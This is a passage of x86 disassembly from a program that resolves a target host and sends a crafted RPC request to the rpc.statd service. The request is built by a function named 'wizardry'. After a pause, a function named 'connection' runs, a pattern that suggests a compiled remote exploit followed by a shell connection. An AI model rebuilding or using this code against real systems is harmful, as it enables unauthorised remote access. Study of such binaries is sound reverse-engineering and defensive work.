call   8048a98 <exit@plt>
lea    esi,[esi+0x0]
sub    esp,0x8
push   0x10
lea    eax,[ebp-0x48]
push   eax
call   8048a88 <bzero@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x48],0x2
movzx  eax,WORD PTR [ebp-0x6a]
sub    esp,0xc
push   eax
call   8048ae8 <htons@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x92],ax
mov    ax,WORD PTR [ebp-0x92]
mov    WORD PTR [ebp-0x46],ax
lea    eax,[ebp-0x78]
sub    esp,0x8
push   DWORD PTR [ebp-0x64]
push   eax
call   8049488 <getip>
add    esp,0xc
mov    eax,DWORD PTR [ebp-0x78]
mov    DWORD PTR [ebp-0x44],eax
mov    eax,DWORD PTR [ebp-0x54]
mov    DWORD PTR [ebp-0x20],eax
mov    DWORD PTR [ebp-0x1c],0x0
cmp    DWORD PTR [ebp-0x50],0x0
jne    8049860 <main+0x380>
sub    esp,0x8
lea    eax,[ebp-0x74]
push   eax
push   DWORD PTR [ebp-0x1c]
push   DWORD PTR [ebp-0x20]
push   0x1
push   0x186b8
lea    eax,[ebp-0x48]
push   eax
call   8048a18 <clntudp_create@plt>
add    esp,0x20
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
jne    8049834 <main+0x354>
sub    esp,0xc
push   0x8049bfa
call   80489a8 <clnt_pcreateerror@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
nop
mov    DWORD PTR [ebp-0x28],0x2
mov    DWORD PTR [ebp-0x24],0x0
sub    esp,0x4
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,DWORD PTR [eax+0x4]
lea    eax,[ebp-0x28]
push   eax
push   0x4
push   DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [edx+0x14]
call   eax
add    esp,0x10
jmp    80498a4 <main+0x3c4>
mov    esi,esi
sub    esp,0x8
push   0x0
push   0x0
lea    eax,[ebp-0x74]
push   eax
push   0x1
push   0x186b8
lea    eax,[ebp-0x48]
push   eax
call   8048958 <clnttcp_create@plt>
add    esp,0x20
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
jne    80498a4 <main+0x3c4>
sub    esp,0xc
push   0x8049c0b
call   80489a8 <clnt_pcreateerror@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
lea    esi,[esi+0x0]
sub    esp,0xc
push   0x0
push   0x0
push   0x0
push   0x0
push   0x8049c1c
call   8048a48 <authunix_create@plt>
add    esp,0x20
mov    DWORD PTR [ebp-0x98],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    ecx,DWORD PTR [ebp-0x98]
mov    DWORD PTR [eax],ecx
sub    esp,0xc
push   DWORD PTR [ebp-0x58]
push   DWORD PTR [ebp-0x5c]
push   DWORD PTR [ebp-0x60]
push   DWORD PTR [ebp-0x70]
push   DWORD PTR [ebp-0x68]
call   80491f4 <wizardry>
add    esp,0x20
mov    DWORD PTR [ebp-0x10],eax
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,DWORD PTR [eax+0x4]
push   DWORD PTR [ebp-0x1c]
push   DWORD PTR [ebp-0x20]
lea    eax,[ebp-0x38]
push   eax
push   0x8048dd0
lea    eax,[ebp-0x2c]
push   eax
push   0x8048d6c
push   0x1
push   DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [edx]
call   eax
add    esp,0x20
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x0
je     804997c <main+0x49c>
sub    esp,0x8
push   0x8049c26
push   DWORD PTR [ebp-0x14]
call   8048b88 <clnt_perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x5
call   8048a08 <sleep@plt>
add    esp,0x10
sub    esp,0x10
mov    DWORD PTR [ebp-0x9c],esp
lea    esi,[ebp-0x48]
mov    DWORD PTR [ebp-0xa0],esi
cld    
mov    DWORD PTR [ebp-0xa4],0x4
mov    edi,DWORD PTR [ebp-0x9c]
mov    esi,DWORD PTR [ebp-0xa0]
mov    ecx,DWORD PTR [ebp-0xa4]
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
call   804915c <connection>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0x10]
call   8048ac8 <free@plt>
add    esp,0x10
sub    esp,0xc
mov    eax,DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [eax+0x4]
push   DWORD PTR [ebp-0x14]
mov    eax,DWORD PTR [eax+0x10]
call   eax
add    esp,0x10
mov    eax,0xffffffff
lea    esp,[ebp-0x8]
pop    esi
pop    edi
pop    ebp
ret    
nop
nop
nop
nop
nop
nop
push   ebp
mov    eax,ds:0x804adfc
mov    ebp,esp
push   ebx
sub    esp,0x4
cmp    eax,0xffffffff
mov    ebx,0x804adfc
je     80499dc <__do_global_ctors_aux+0x2c>
lea    esi,[esi+0x0]
lea    edi,[edi+eiz*1+0x0]
sub    ebx,0x4
call   eax
mov    eax,DWORD PTR [ebx]
cmp    eax,0xffffffff
jne    80499d0 <__do_global_ctors_aux+0x20>
pop    eax
pop    ebx
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
nop
nop
push   ebp
mov    ebp,esp
push   ebx
push   edx
call   80499f6 <_fini+0xa>
pop    ebx
add    ebx,0x1416
lea    esi,[esi+0x0]
call   8048be0 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
